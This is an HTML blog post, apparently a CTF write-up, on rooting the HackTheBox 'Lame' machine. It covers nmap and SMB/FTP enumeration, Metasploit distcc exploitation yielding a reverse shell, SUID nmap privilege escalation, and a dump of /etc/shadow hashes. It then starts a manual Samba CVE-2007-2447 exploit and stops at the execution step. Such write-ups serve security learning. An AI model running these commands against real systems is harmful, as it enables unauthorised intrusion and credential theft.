@@ -1,0 +1,790 @@
+<!DOCTYPE html>
+<html lang="en-us"><head>
+  <meta charset="utf-8">
+  <title>Lame HackTheBox - Write-Up</title>
+
+  <!-- mobile responsive meta -->
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Rooting the Lame box from HackTheBox">
+  <meta name="author" content="See the description ...">
+  <meta name="generator" content="Hugo 0.71.0" />
+
+  <!-- plugins -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/bootstrap/bootstrap.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/Ionicons/css/ionicons.min.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/magnific-popup/magnific-popup.css">
+  
+  <link rel="stylesheet" href="http://192.168.1.191/plugins/slick/slick.css">
+  
+
+  <!-- Main Stylesheet -->
+  
+  <link rel="stylesheet" href="http://192.168.1.191/scss/style.min.css" media="screen">
+
+  <!--Favicon-->
+  <link rel="shortcut icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+  <link rel="icon" href="http://192.168.1.191/images/favicon.png" type="image/x-icon">
+
+</head><body>
+<!-- preloader start -->
+<div class="preloader">
+  
+</div>
+<!-- preloader end -->
+
+<header class="navigation">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        
+        <nav class="navbar">
+          
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navigation">
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">
+              <img src="http://192.168.1.191/images/home.jpeg" alt="Chapl1n" class="img-responsive">
+            </a>
+          </div>
+          
+          <div class="collapse navbar-collapse" id="navigation">
+            <ul class="nav navbar-nav navbar-right">
+              <li><a href="http://192.168.1.191">Home</a></li>
+
+              
+              
+              <li><a href="http://192.168.1.191/about">About</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/project">Projects</a></li>
+              
+              
+              
+              <li><a href="http://192.168.1.191/blog">Blog</a></li>
+              
+              
+              
+              <li><a href="https://twitter.com/MrChapl1n">Twitter</a></li>
+              
+              
+
+              
+
+            </ul>
+          </div>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+<section class="page-title bg-2" style="background-image: url('http://192.168.1.191/images/featue-bg.jpg');">
+  <div class="container">
+    <div class="row">
+      <div class="col-md-12">
+        <div class="block">
+          <h1>Lame HackTheBox - Write-Up</h1>
+          <p>Rooting the Lame box from HackTheBox</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="page-wrapper">
+	<div class="container">
+		<div class="row">
+			<div class="col-md-8">
+				<div class="post post-single">
+					<h2 class="post-title">Lame HackTheBox - Write-Up</h2>
+					<div class="post-meta">
+						<ul>
+              <li><i class="ion-calendar"></i> June 24, 2020</li>
+              <li><i class="ion-android-people"></i>
+                Posted By
+                
+                <a class="text-primary" href="/author/chapl1n">Chapl1n</a>
+                
+              </li>
+              <li><i class="ion-pricetags"></i> 
+                
+                <a href="/tags/hackthebox">Hack the box</a>
+								
+                , <a href="/tags/linux">Linux</a>
+								
+                , <a href="/tags/distcc">Distcc</a>
+								
+                , <a href="/tags/tty%20shell">Tty shell</a>
+								
+                , <a href="/tags/privesc">Privesc</a>
+								
+              </li>
+            </ul>
+					</div>
+					<div class="post-thumb">
+						<img class="img-responsive" src="/images/blog/lame/cover.jpg" alt="Lame HackTheBox - Write-Up">
+					</div>
+					<div class="post-content post-excerpt">
+						<p>This writeup will be my approach for pwning the HackTheBox machine called &lsquo;Lame&rsquo; and how I have learned new things along the way.  The writeup will be in two sections - with and without Metasploit.</p>
+<h1 id="section-1---with-metasploit"><strong>Section 1 - With Metasploit</strong></h1>
+<h1 id="reconnaissance"><strong>Reconnaissance</strong></h1>
+<h3 id="step-1---initial-nmap-scan">Step 1 - Initial nmap scan</h3>
+<p>To start, nmap is used to scan for open TCP ports and identify the services running on Lame. For a description of the specific switches used, take a look at my first article <a href="/blog/legacy"><strong>Legacy</strong></a>.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ nmap -T4 -Pn -n --min-rate=1000 --max-rate=5000 --max-retries=5 -p- 10.10.10.3
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 19:18 BST
+Nmap scan report for 10.10.10.3
+Host is up (0.031s latency).
+Not shown: 65530 filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3632/tcp open  distccd
+
+Nmap done: 1 IP address (1 host up) scanned in 85.71 seconds
+</code></pre><p>The scan shows that ports <code>21</code> (FTP), <code>22</code> (SSH), <code>139</code> &amp; <code>445</code> (SMB) and <code>3632</code> (distccd) are open. I am not aware of what the distccd service is, so before going any further with my reconnaissance, I want to get a brief overview about it&rsquo;s function before I can learn to perhaps attack it. After a bit of a Google searching, I discover that distcc is a tool used for speeding up the compilation of source code.</p>
+<h3 id="step-2---aggressive-nmap-scan">Step 2 - Aggressive nmap scan</h3>
+<p>An aggresive nmap scan will now be done for the open TCP ports to provide me with any detailed information related to the system.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ nmap -T4 -Pn -n -p 21,22,139,445,3632 -A -oA tcp_Aggressive_Lame_Scan 10.10.10.3
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-16 19:54 BST
+Nmap scan report for 10.10.10.3
+Host is up (0.035s latency).
+
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 10.10.16.195
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
+3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+|_clock-skew: mean: -3d00h52m45s, deviation: 2h49m45s, median: -3d02h52m48s
+| smb-os-discovery: 
+|   OS: Unix (Samba 3.0.20-Debian)
+|   Computer name: lame
+|   NetBIOS computer name: 
+|   Domain name: hackthebox.gr
+|   FQDN: lame.hackthebox.gr
+|_  System time: 2020-06-13T12:01:40-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.62 seconds
+------------------------------------------------------------------------------------------------------------------------------------------
+</code></pre><p>The FTP server has anonymous access which means anyone can access the system. The scan details the version of the FTP server (<code>vsftpd 2.3.4</code>), HTTP server (<code>Samba smbd 3.0.20-Debian</code>) and the version of SSH used (<code>OpenSSH 4.7p1</code>). I do not expect there to much available (if anything) relating to SSH vulnerabilties as these are more uncommon than other services. There is a version number for the distcc service (<code>distccd v1</code>) but I have no prior knowledge of how exploitable it is.</p>
+<h1 id="enumeration"><strong>Enumeration</strong></h1>
+<h3 id="step-1---access-ftp-server">Step 1 - Access FTP server</h3>
+<p>I start my enumeration of Lame by accessing the FTP server.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ ftp 10.10.10.3
+Connected to 10.10.10.3.
+220 (vsFTPd 2.3.4)
+Name (10.10.10.3:student): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; 
+</code></pre><p>I was able to get access to the FTP server thanks to the anonymous access and can now view the server&rsquo;s contents.</p>
+<pre><code>ftp&gt; ls -la
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
+drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
+226 Directory send OK.
+ftp&gt;
+</code></pre><p>The results don&rsquo;t appear to be giving me much to work with, this could mean that the FTP server is just a red herring. I will now try accessing the SMB server on Lame to hopefully get some information I can leverage for later use.</p>
+<h3 id="step-2---access-smb-server">Step 2 - Access SMB server</h3>
+<p>I will attempt to access the SMB server and its file shares using the <code>smbclient</code> tool.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ smbclient -L \\10.10.10.3
+Enter WORKGROUP\student's password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            LAME
+</code></pre><p>Now with access to the SMB srever I can see several shares within it. The share called <code>tmp</code> leads me to believe that the server is just a rabbit hole due to the comment <code>oh noes</code>. I now try to access the <code>ADMIN$</code> file share as this is the most obvious location for sensitive information to be stored.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ smbclient \\\\10.10.10.3\\ADMIN$
+Enter WORKGROUP\student's password: 
+Anonymous login successful
+tree connect failed: NT_STATUS_ACCESS_DENIED
+</code></pre><p>I was able log into the ADMIN$ file share but was denied access to its contents, this appears to be another dead-end so I will start researching the services themselves for potential vulnerabilities. I will use the tool <code>searchsploit</code> to hopefully identify any potential exploits for the services running on Lame.</p>
+<h3 id="step-3---searchsploit-services">Step 3 - Searchsploit services</h3>
+<h3 id="step-31---ftp-21">Step 3.1 - FTP (21)</h3>
+<p>The aggressive nmap scan showed that the version of FTP used by Lame was <code>vsFTPd 2.3.4</code>.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ searchsploit vsftpd 2.3.4
+--------------------------------------------------------- ----------------------------------------
+ Exploit Title                                           |  Path
+                                                         | (/usr/share/exploitdb/)
+--------------------------------------------------------- ----------------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)   | exploits/unix/remote/17491.rb
+--------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</code></pre><p>The result appears promising as there is a Metasploit backdoor command execution exploit that I may be able to use. I am still in the enumeration phase however and need to look at the other services before determining what is my best option for exploitation.</p>
+<h3 id="step-32---ssh-22">Step 3.2 - SSH (22)</h3>
+<p>I do not expect there to be much (if any) opportunities for exploiting SSH since it is a fairly recent version and SSH is uncommon for exploitation.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ searchsploit OpenSSH 4.7
+Exploits: No Result
+Shellcodes: No Result
+</code></pre><p>As expected, there are no known exploits for the SSH service running in Lame.</p>
+<h3 id="step-33---smb-139445">Step 3.3 - SMB (139/445)</h3>
+<p>I will now take a look at TCP port 445 as it gives me a full version number of the SMB server.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ searchsploit Samba 3.0.20
+---------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                    |  Path
+                                                                                  | (/usr/share/exploitdb/)
+---------------------------------------------------------------------------------- ----------------------------------------
+Samba 3.0.20 &lt; 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | exploits/unix/remote/16320.rb
+Samba &lt; 3.0.20 - Remote Heap Overflow                                             | exploits/linux/remote/7701.txt
+---------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</code></pre><p>I see from the result that there is a Metasploit module that will potentially enable me to perform remote command execution (RCE) on Lame.</p>
+<h3 id="step-34---distcc-3362">Step 3.4 - Distcc (3362)</h3>
+<pre><code>student@teacher:~/hackthebox/Lame$ searchsploit distcc
+------------------------------------------------- ----------------------------------------
+ Exploit Title                                   |  Path
+                                                 | (/usr/share/exploitdb/)
+------------------------------------------------- ----------------------------------------
+DistCC Daemon - Command Execution (Metasploit)   | exploits/multiple/remote/9915.rb
+</code></pre><p>The searchsploit result shows that there is a command cxecution exploit module on Metasploit for the distcc service. With all the searchsploit scans done, I begin targeting the different the services within Lame for exploitation using Metasploit.</p>
+<h1 id="exploitation"><strong>Exploitation</strong></h1>
+<h3 id="step-1---ftp">Step 1 - FTP</h3>
+<pre><code>msf5 &gt; search vsftpd 2.3.4                                                                                                 
+                                                                                                                           
+Matching Modules                                                                                                           
+=============
+
+   #  Name                                                      Disclosure Date  Rank       Check  Description
+   -  ----                                                      ---------------  ----       -----  -----------
+   0  auxiliary/gather/teamtalk_creds                                            normal     No     TeamTalk Gather Credentials
+   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
+   2  exploit/multi/http/struts2_namespace_ognl                 2018-08-22       excellent  Yes    Apache Struts 2 Namespace Redirect OGNL Injection
+   3  exploit/unix/ftp/vsftpd_234_backdoor             
+</code></pre><p>There are four results but the one of most interest to me is <code>3</code>, this is the vsftpd 2.3.4 backdoor that I identified with searchsploit.</p>
+<h3 id="step-11---configure-module">Step 1.1 - Configure module</h3>
+<p>The module is loaded and must now be configured to target Lame.</p>
+<pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</code></pre><p>The <code>RPORT</code> value does not need to be set as the default value of <code>21</code> is valid. I just need to configure the <code>RHOST</code> value to the IP address of Lame.</p>
+<pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set RHOSTS 10.10.10.3
+RHOSTS =&gt; 10.10.10.3
+</code></pre><p>I check the configuration again just before executing just to be sure everything is set.</p>
+<pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT   21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+</code></pre><p>Everything looks good, so I run the exploit module.</p>
+<h3 id="step-12---execute-payload">Step 1.2 - Execute payload</h3>
+<pre><code>msf5 exploit(unix/ftp/vsftpd_234_backdoor) &gt; exploit
+
+[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
+[*] 10.10.10.3:21 - USER: 331 Please specify the password.
+</code></pre><p>This is where I got into a bit of a problem scenario. The module is being executed, but asks for a password which I don&rsquo;t have. For now, I will move on to other possible exploits.</p>
+<p>The next logical port to investigate would be TCP 139/445 (SMB), but since Legacy was pwned using an SMB exploit, I want to first try targeting the distcc service instead.</p>
+<h3 id="step-2---metasploit-distcc">Step 2 - Metasploit distcc</h3>
+<p>I load up Metasploit and search for the exploit related to distcc.</p>
+<pre><code> msf5 &gt; search distcc
+
+Matching Modules
+================
+
+   #  Name                           Disclosure Date  Rank       Check  Description
+   -  ----                           ---------------  ----       -----  -----------
+   0  exploit/unix/misc/distcc_exec  2002-02-01       excellent  Yes    DistCC Daemon Command Execution
+</code></pre><p>I find the module needed and load it up.</p>
+<h3 id="step-21---configure-module">Step 2.1 - Configure module</h3>
+<p>The module needs to be configured to target Lame.</p>
+<pre><code>msf5 exploit(unix/misc/distcc_exec) &gt; options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT   3632             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+</code></pre><p>The RPORT value is set correctly by default and all I need to do is set the RHOST value.</p>
+<pre><code>msf5 exploit(unix/misc/distcc_exec) &gt; set RHOSTS 10.10.10.3
+RHOSTS =&gt; 10.10.10.3
+</code></pre><p>I check the configuration of the module again to ensure everything is properly configured.</p>
+<pre><code>msf5 exploit(unix/misc/distcc_exec) &gt; options
+
+Module options (exploit/unix/misc/distcc_exec):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS  10.10.10.3       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   RPORT   3632             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+</code></pre><p>Everything looks good, so I run the module to see if it works.</p>
+<h3 id="step-22---execute-payload">Step 2.2 - Execute payload</h3>
+<pre><code>msf5 exploit(unix/misc/distcc_exec) &gt; exploit
+
+[*] Started reverse TCP double handler on 10.10.16.195:4444 
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 4DvR1lCRH4cXDyvn;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: &quot;4DvR1lCRH4cXDyvn\r\n&quot;
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (10.10.16.195:4444 -&gt; 10.10.10.3:43369) at 2020-06-17 19:52:34 +0100
+</code></pre><p>The payload is a success and I have a reverse shell connection on Lame.</p>
+<h1 id="post-exploitation"><strong>Post Exploitation</strong></h1>
+<h3 id="step-1---create-tty-shell">Step 1 - Create TTY shell</h3>
+<p>With the reverse shell in place I want to create a TTY shell to access Lame&rsquo;s file system.</p>
+<pre><code>shell   
+[*] Trying to find binary(python) on target machine
+[*] Found python at /usr/bin/python
+[*] Using `python` to pop up an interactive shell
+</code></pre><p>I found the following to be a really useful guide for spawning TTY shells, <a href="https://netsec.ws/?p=337"><code>https://netsec.ws/?p=337</code></a>. I changed it a bit so that it establishes a bash session rahter than a normal shell (sh) session.</p>
+<pre><code>python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;);'
+daemon@lame:/tmp$
+</code></pre><p>The script is a success, so now I need to see what account I am operating as (<code>whoami</code>) and what my privileges are (<code>pwd</code>).</p>
+<pre><code>daemon@lame:/tmp$ whoami
+whoami
+daemon
+</code></pre><pre><code>daemon@lame:/tmp$ pwd
+pwd
+/tmp
+</code></pre><h3 id="step-2---find-root-flag">Step 2 - Find root flag</h3>
+<p>This information is helpful but I don&rsquo;t have root access to Lame.  I begin looking around the file system and find a folder called <code>root</code>, so I list all its contents and the privileges of any files/folders.</p>
+<pre><code>daemon@lame:/root$ ls -la
+ls -la
+total 80
+drwxr-xr-x 13 root root 4096 Jun 17 03:06 .
+drwxr-xr-x 21 root root 4096 May 20  2012 ..
+-rw-------  1 root root  373 Jun 17 03:06 .Xauthority
+lrwxrwxrwx  1 root root    9 May 14  2012 .bash_history -&gt; /dev/null
+-rw-r--r--  1 root root 2227 Oct 20  2007 .bashrc
+drwx------  3 root root 4096 May 20  2012 .config
+drwx------  2 root root 4096 May 20  2012 .filezilla
+drwxr-xr-x  5 root root 4096 Jun 17 03:07 .fluxbox
+drwx------  2 root root 4096 May 20  2012 .gconf
+drwx------  2 root root 4096 May 20  2012 .gconfd
+drwxr-xr-x  2 root root 4096 May 20  2012 .gstreamer-0.10
+drwx------  4 root root 4096 May 20  2012 .mozilla
+-rw-r--r--  1 root root  141 Oct 20  2007 .profile
+drwx------  5 root root 4096 May 20  2012 .purple
+-rwx------  1 root root    4 May 20  2012 .rhosts
+drwxr-xr-x  2 root root 4096 May 20  2012 .ssh
+drwx------  2 root root 4096 Jun 17 03:06 .vnc
+drwxr-xr-x  2 root root 4096 May 20  2012 Desktop
+-rwx------  1 root root  401 May 20  2012 reset_logs.sh
+-rw-------  1 root root   33 Mar 14  2017 root.txt
+-rw-r--r--  1 root root  118 Jun 17 03:07 vnc.log
+</code></pre><p>As expected, all the files require root privileges to access.</p>
+<h1 id="privilege-escalation"><strong>Privilege Escalation</strong></h1>
+<p>Up to this point, I had no experience in Linux privilege escalation (<code>privesc</code>) but found the following to be an excellent resource to learn from, <a href="https://payatu.com/guide-linux-privilege-escalation"><code>https://payatu.com/guide-linux-privilege-escalation</code></a>. There are a lot of options for gaining root privileges such as exploiting vulnerabilities in the kernel or exploiting vulnerable services such as SMB or RDP. It is advised however to use kernel exploitation as a last option because it could make the system unstable and possibly corrupt it.</p>
+<p>The option I will use relates to Set User ID (<code>SUID</code>) executables. SUID is a feature of Linux systems that allow applications and scripts to be run with the permissions of another user (i.e. root). The <code>ping</code> commmand which I use quite often is a SUID executable.  Anytime I run the ping command as a non-root user, the command would have been run with root privileges. Many files are made SUID to make system usage easier,  however, if implemented incorrectly, SUID files can be leveraged to escalate privileges.</p>
+<h3 id="step-1---idenitfy-suid-executables">Step 1 - Idenitfy SUID executables</h3>
+<pre><code>daemon@lame:/root$ find / -perm -u=s -type f 2&gt;/dev/null
+find / -perm -u=s -type f 2&gt;/dev/null
+/bin/umount
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/ping6
+/sbin/mount.nfs
+/lib/dhcp3-client/call-dhclient-script
+/usr/bin/sudoedit
+/usr/bin/X
+/usr/bin/netkit-rsh
+/usr/bin/gpasswd
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/netkit-rlogin
+/usr/bin/arping
+/usr/bin/at
+/usr/bin/newgrp
+/usr/bin/chfn
+/usr/bin/nmap
+/usr/bin/chsh
+/usr/bin/netkit-rcp
+/usr/bin/passwd
+/usr/bin/mtr
+/usr/sbin/uuidd
+/usr/sbin/pppd
+/usr/lib/telnetlogin
+/usr/lib/apache2/suexec
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/pt_chown
+</code></pre><p>The command I just ran lists all the files on Lame that are SUID executables. The syntax <code>2&gt;/dev/null</code> is used to forward any errors received during the command execution to the /dev/null folder. Essentially, it is just a black-hole for any errors!  In the Payatu article, it referenced how nmap versions between 2.02 - 5.21 can be exploited due to a feature called <code>interactive mode</code> that allowed users to escape their current shell to a root shell.</p>
+<h3 id="step-2---accessing-nmap-interactive-mode">Step 2 - Accessing nmap interactive mode</h3>
+<pre><code>daemon@lame:/root$ nmap
+nmap
+Nmap 4.53 ( http://insecure[.]org )
+</code></pre><p>Lame&rsquo;s version of nmap is one that contains interactive mode. I check if nmap has the SUID bit set for its privileges just to be sure.</p>
+<pre><code>daemon@lame:/root$ ls -la /usr/bin/nmap              
+ls -la /usr/bin/nmap
+-rwsr-xr-x 1 root root 780676 Apr  8  2008 /usr/bin/nmap
+</code></pre><p>I see the <code>s</code> bit set for nmap which is what I want - a SUID binary. I run the command to access interactive mode.</p>
+<pre><code>daemon@lame:/root$ nmap --interactive
+nmap --interactive
+
+Starting Nmap V. 4.53 ( http://insecure.org )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt;  
+</code></pre><p>With the nmap shell I can now escape it to get a system shell with escalated privileges.</p>
+<h3 id="step-3---access-system-shell">Step 3 - Access system shell</h3>
+<pre><code>nmap&gt; !sh
+!sh
+sh-3.2# 
+</code></pre><p>I check what user I am in the system shell.</p>
+<h3 id="step-4---identifying-privilege-level-and-root-flag">Step 4 - Identifying privilege level and root flag</h3>
+<pre><code>sh-3.2# whoami
+whoami
+root
+</code></pre><p>Success, all I need to do now is access the root.txt file in the root folder.</p>
+<pre><code>cat /root/root.txt
+92caac3be140ef409e45721348a4e9df
+</code></pre><p>I now have root access to Lame but to go further, I could find the password hashes for Lame&rsquo;s users.</p>
+<h3 id="step-5---find-shadow-file">Step 5 - Find shadow file</h3>
+<pre><code>sh-3.2# cat /etc/shadow
+cat /etc/shadow
+root:$1$p/d3CvVJ$4HDjev4SJFo7VMwL2Zg6P0:17239:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$NsRwcGHl$euHtoVjd59CxMcIasiTw/.:17239:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$dwLrUikz$LRJRShCPfPyYb3r6pinyM.:17239:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+service:$1$cwdqim5m$bw71JTFHNWLjDTmYTNN9j/:17239:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+snmp:*:15480:0:99999:7:::
+makis:$1$Yp7BAV10$7yHWur1KMMwK5b8KRZ2yK.:17239:0:99999:7::
+</code></pre><p>If I wanted to get the passwords of the Lame&rsquo;s users I would use tools such as <code>hashcat</code> to &lsquo;crack&rsquo; the password hashes.  Think of a password hash as a digital fingerprint for a password.  It is a form of encryption that is not intended to be decrypted.  However, tools such as hashcat can take a dictionary of words, calculates the hash values and compares them against the hash for a given account.  If the hashes match, then it is considered &lsquo;cracked&rsquo; and an attacker now has the correct password to log into a target.  However, the process of cracking hashes can take a long period of time depending on the processing power of the attacking box, as well as complexity of the hash value and the size of the dictionary used.</p>
+<p>Other good sources for privilege escalation:</p>
+<blockquote>
+<ul>
+<li><a href="https://gtfobins.github.io/"><code>https://gtfobins.github.io/</code></a></li>
+<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"><code>https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</code></a></li>
+</ul>
+</blockquote>
+<h1 id="section-2---without-metasploit"><strong>Section 2 - Without Metasploit</strong></h1>
+<p>I know that Lame will be targeted via its SMB service since FTP and distcc have already been targeted. The SMB version used by Lame&rsquo;s Samba server was <code>3.0.20</code> and I know that Metasploit contains exploits for this, but I need to find a manual exploit for it. I am trying to pwn Lame without Metasploit to show multiple options of targeting a system.</p>
+<h1 id="enumeration-1"><strong>Enumeration</strong></h1>
+<h3 id="step-1---smb-version-exploit-enumeration">Step 1 - SMB version exploit enumeration</h3>
+<p>Whilst surfing the internet for SMB exploits, I came across the vulnerability <a href="https://www.cvedetails.com/cve/CVE-2007-2447/"><code>CVE-2007-2447</code></a>. This is a vulnerability that affects Samba servers between <code>3.0.0 - 3.0.25rc3</code>. I found a blog piece that details a python script that will exploit this vulnerbaility and create a reverse shell from the vulnerable system to the attacker&rsquo;s box.</p>
+<blockquote>
+<p><a href="https://amriunix.com/post/cve-2007-2447-samba-usermap-script/"><code>https://amriunix.com/post/cve-2007-2447-samba-usermap-script/</code></a></p>
+</blockquote>
+<h3 id="step-2---cloning-python-exploit-script">Step 2 - Cloning python exploit script</h3>
+<p>The blog specifies a Github repo containing the python script needed to exploit CVE-2007-2447.</p>
+<pre><code>student@teacher:~/hackthebox/Lame$ git clone https://github.com/amriunix/CVE-2007-2447.git
+Cloning into 'CVE-2007-2447'...
+remote: Enumerating objects: 8, done.
+remote: Total 8 (delta 0), reused 0 (delta 0), pack-reused 8
+Unpacking objects: 100% (8/8), 1.64 KiB | 239.00 KiB/s, done.
+</code></pre><pre><code>student@teacher:~/hackthebox/Lame$ ls
+CVE-2007-2447  tcp_Agressive_Lame_Scan.gnmap  tcp_Agressive_Lame_Scan.nmap  tcp_Agressive_Lame_Scan.xml
+student@teacher:~/hackthebox/Lame$ cd CVE-2007-2447/
+student@teacher:~/hackthebox/Lame/CVE-2007-2447$ ls
+README.md  usermap_script.py
+</code></pre><h1 id="exploitation-1"><strong>Exploitation</strong></h1>
+<p>Before executing the script with the needed parameters, I need to set up a listener on my attacking box to wait for the reverse shell connection.</p>
+<h3 id="step-1---setting-up-listener-on-attacking-box">Step 1 - Setting up listener on attacking box</h3>
+<p>I set up the listener on port 4444 using the netcat (<code>nc</code>) command-line tool just like before when pwning Legacy.</p>
+<pre><code>student@teacher:~$ nc -nlvp 4444
+listening on [any] 4444 ...
+</code></pre><p>The next step is executing the python script to establish the reverse shell connection.</p>
+<h3 id="step-2---executing-python-script">Step 2 - Executing python script</h3>
